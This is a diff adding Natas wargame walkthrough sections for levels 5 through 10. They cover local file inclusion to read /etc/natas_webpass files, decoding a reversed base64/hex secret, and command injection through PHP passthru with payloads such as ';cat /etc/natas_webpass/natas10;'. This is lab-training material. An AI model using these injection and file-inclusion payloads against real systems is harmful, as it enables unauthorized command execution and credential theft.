@@ -143,3 +143,291 @@ Priority: u=0, i
 Modifying the value `loggedin` to `1` will allow the user to get the password after letting the request go.
 
 ## Level 05 ➡ Level 06
+
+This time the user is welcomed with a form, a single textbox asking for "input secret".
+
+- Find how the page works and what it wants the user to do.
+- Inspect the code using the button presented by the page.
+- Somehow get the correct input secret or bypass the check.
+
+### Logic behind the form
+
+After inspecting the source code, a particular part of it stands out:
+
+```php
+<?
+include "includes/secret.inc";
+
+    if(array_key_exists("submit", $_POST)) {
+        if($secret == $_POST['secret']) {
+        print "Access granted. The password for natas7 is <censored>";
+    } else {
+        print "Wrong secret";
+    }
+    }
+?>
+```
+
+What does this code do?:
+
+- `include "includes/secret.inc";`: imports the file that defines the value of `$secret`.
+- `if(array_key_exists("submit", $_POST))`: checks if the user submitted the form.
+- `if($secret == $_POST['secret'])`: check if the value imported earlier matches the one taken from the form named `secret`.
+
+### Finding the password
+
+If the user pays attention to the previous php snippet, the correct value for the secret comes from a file called `secret.inc` in path `includes/`. Going to this location in the website:
+
+```http
+http://natas6.natas.labs.overthewire.org/includes/secret.inc
+```
+
+Gives the user a blank page. But entering the developer tools (F12) or opening the source code view (CTRL+u) shows the user the following:
+
+```php
+<?
+$secret = "SECRET_REDACTED";
+?>
+```
+
+Using this secret in the form will allow the user to get the password.
+
+## Level 06 ➡ Level 07
+
+The page gives the user two links: home and about.
+
+- Understand what the pages wants the user to do.
+- Inspect relevant information (html, source code, resources).
+- Find the password.
+
+### Inspection 06
+
+Looking at the html, a particular comment stands out:
+
+```html
+<?--
+hint: password for webuser natas8 is in /etc/natas_webpass/natas8 
+-->
+```
+
+Trying out the home and about links show the user that the url changes:
+
+```http
+http://natas7.natas.labs.overthewire.org/index.php?page=home
+```
+
+Changing the value of `page=` to something different gives the user the following message:
+
+```text
+Warning: include(test): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21
+```
+
+### Getting the password for natas8
+
+If the user remembers the comment in the html and the error message received while playing with the url, it will be no surprise that combining both things will give result in the password:
+
+```http
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+```
+
+## Level 07 ➡ Level 08
+
+This room welcomes the user with the same form as level 05 to 06.
+
+- Inspect all resources.
+- Understand what the page wants from the user.
+- Get the password.
+
+### Inspection 07
+
+#### Source code
+
+Inspection via CTRL+u gives no relevant information. Neither does devtools. Inspection via the link given by the page has this relevant code snippet:
+
+```php
+<?
+
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+
+if(array_key_exists("submit", $_POST)) {
+    if(encodeSecret($_POST['secret']) == $encodedSecret) {
+    print "Access granted. The password for natas9 is <censored>";
+    } else {
+    print "Wrong secret";
+    }
+}
+?>
+```
+
+> **TLDR**: encodes the secret using base64, reverses it and converts it from binary to hex.
+
+### Writing a decoder
+
+With the logic of the encoding method, the user can easily write the inverse. Here is the python version:
+
+```python
+import base64, binascii
+
+encoded_secret = "3d3d516343746d4d6d6c315669563362"
+hex_decoded = binascii.unhexlify(encoded_secret)
+reversed_str = hex_decoded[::-1]
+secret = base64.b64decode(reversed_str).decode('utf-8')
+print(secret)
+```
+
+Using the value given by the decoder will allow the user to get the next password.
+
+## Level 08 ➡ Level 09
+
+This page welcomes the user with a form: "Find words containing".
+
+- Test the form.
+- Inspect the resources.
+- Get the password.
+
+### Form 08
+
+It appears the form returns all the words that contain the text the user typed.
+
+- It does not work with symbols.
+- It does not work with numbers.
+- It changes the value `needle=` in the URL.
+
+### Inspection 08
+
+The devtools and source view don't have any relevant information. Using the source code viewer provided by the page gives the user the following relevant code:
+
+```php
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+```
+
+Thoughts:
+
+- The variable `$key` takes the value from the url, specifically from the `needle` param.
+- The variable `$key` is used in a `grep` command with the *ignore case* flag.
+- It looks like it takes the words from a file named `dictionary.txt`.
+
+The file `dictionary.txt` can be inspected by:
+
+```http
+http://natas9.natas.labs.overthewire.org/dictionary.txt
+```
+
+### Research 08
+
+- It appears the `passthru()` function in php is dangerous and normally should be disabled in `php.ini`.
+- The usage of `passthru()` gives the user the chance to inject php code in the `needle=` param.
+
+### PHP code injection 01
+
+In a normal scenario the url looks like this:
+
+```http
+http://natas9.natas.labs.overthewire.org/?needle=example
+```
+
+To inject php code the user has to add semicolons `;` to "finish" the `grep` execution that runs on the server.
+
+```http
+http://natas9.natas.labs.overthewire.org/?needle=;ls;
+```
+
+The previous example runs `ls` on the server. The backend `grep` will end up looking like this:
+
+```bash
+grep -i ;ls; dictionary.txt
+```
+
+### Getting password for natas10
+
+The user has to remember some information given by OverTheWire at the beginning:
+
+> All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.
+
+With this information and the power to inject php code, the user can easily get to that location and grab the password.
+
+```http
+http://natas9.natas.labs.overthewire.org/?needle=;cat%20/etc/natas_webpass/natas10;
+```
+
+## Level 09 ➡ Level 10
+
+The page is similar to the last one. This time it has a new message that says "*For security reasons, we now filter on certain characters*".
+
+- Test the form.
+- Inspect resources.
+- Try injecting php code.
+- Get the password.
+
+### Inspection 09
+
+The relevant information once again is given by the source viewer provided by the page:
+
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+```
+
+Thoughts:
+
+- It looks like now it checks for presence of semicolon and symbols used for code injection.
+- Even though it checks for symbols, it's still using `passthru()`.
+
+### PHP code injection 02
+
+After some failed attempts, turns out the regex is unavoidable. So user will have to work with the fact that `$key` will reach the `grep` as a regular string.
+
+User can research about `grep`, tldr: it can accept multiple files as haystack.
+
+```bash
+grep -i NEEDLE HAYSTACK1 HAYSTACK2
+```
+
+With this information, the new strategy is now to use `grep` to user's benefit. User knows that no matter what one of the files that `grep` is going to use as haystack is `dictionary.txt`, the other haystack could be the file that contains the password for natas11:
+
+```bash
+grep -i SOMETHING /etc/natas_webpass/natas11 dictionary.txt
+```
+
+The last thing to do is to put some character that will match with the password, this is trial and error.
+
+```bash
+grep -i a /etc/natas_webpass/natas11 dictionary.txt
+```
+
+If it matches the user will see in the output the password, plus the matches from `dictionary.txt`.
+
+## Level 10 ➡ Level 11
+
+This page welcomes the user with a message saying that cookies are protected with XOR encryption and a form that wants a color in hex code.
+
+- Test form.
+- Inspect resources.
+- Understand the meaning of the message.
+- Get the password.
